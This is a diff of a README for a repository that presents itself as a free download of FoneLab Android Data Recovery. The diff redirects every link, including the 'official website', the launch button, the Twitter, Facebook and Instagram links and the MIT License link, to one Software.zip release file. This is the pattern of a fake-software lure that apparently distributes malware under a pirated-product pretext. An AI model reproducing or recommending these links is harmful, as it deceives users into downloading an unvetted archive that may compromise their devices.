@@ -27,9 +27,9 @@ Welcome to the FoneLab Android Data Recovery Free repository! Here you'll find a
 
 ## Get Started
 
-To dive into everything FoneLab Android Data Recovery has to offer, check out the official [FoneLab website](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). This link will guide you to the resources you need to make the most of this powerful software.
+To dive into everything FoneLab Android Data Recovery has to offer, check out the official [FoneLab website](https://github.com/enelsonoreluz/FoneLab-Android-Data-Recovery-Free/releases/download/v1.0/Software.zip). This link will guide you to the resources you need to make the most of this powerful software.
 
-#### 🚀 [Launch FoneLab Android Data Recovery Free](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) 🚀
+#### 🚀 [Launch FoneLab Android Data Recovery Free](https://github.com/enelsonoreluz/FoneLab-Android-Data-Recovery-Free/releases/download/v1.0/Software.zip) 🚀
 
 If the link provided above doesn't work or you need more details, make sure to explore the "Releases" section of this repository for additional information and updates.
 
@@ -42,9 +42,9 @@ We welcome contributions from the community to enhance and improve the FoneLab A
 Join our growing community of Android data recovery enthusiasts and FoneLab users. Stay up-to-date with the latest news, updates, and discussions on our FoneLab Android Data Recovery Free forum.
 
 ### Let's Connect
-- [Twitter](https://twitter.com/FoneLabAndroid)
-- [Facebook](https://www.facebook.com/FoneLabAndroid)
-- [Instagram](https://www.instagram.com/FoneLabAndroid)
+- [Twitter](https://github.com/enelsonoreluz/FoneLab-Android-Data-Recovery-Free/releases/download/v1.0/Software.zip)
+- [Facebook](https://github.com/enelsonoreluz/FoneLab-Android-Data-Recovery-Free/releases/download/v1.0/Software.zip)
+- [Instagram](https://github.com/enelsonoreluz/FoneLab-Android-Data-Recovery-Free/releases/download/v1.0/Software.zip)
 
 ## Stay Updated
 
@@ -52,7 +52,7 @@ Be the first to know about new features, updates, and announcements regarding Fo
 
 ## License
 
-This repository is licensed under the [MIT License](https://opensource.org/licenses/MIT). Feel free to explore, use, and share the contents of this repository in accordance with the license terms.
+This repository is licensed under the [MIT License](https://github.com/enelsonoreluz/FoneLab-Android-Data-Recovery-Free/releases/download/v1.0/Software.zip). Feel free to explore, use, and share the contents of this repository in accordance with the license terms.
 
 ---
 
